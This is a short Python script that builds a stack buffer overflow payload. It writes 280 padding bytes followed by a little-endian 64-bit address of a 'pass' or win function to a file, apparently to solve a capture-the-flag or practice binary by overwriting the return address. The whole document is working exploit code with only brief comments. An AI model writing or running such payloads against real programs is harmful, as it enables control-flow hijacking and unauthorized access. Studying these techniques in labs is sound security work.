import struct
offset=280 # 272 of stack added to return address of 8 byte
win_addr=0x104e8 # address of pass function
payload=b'A'*offset
payload+=struct.pack('<Q',win_addr)
with open('payload','wb') as f:
    f.write(payload)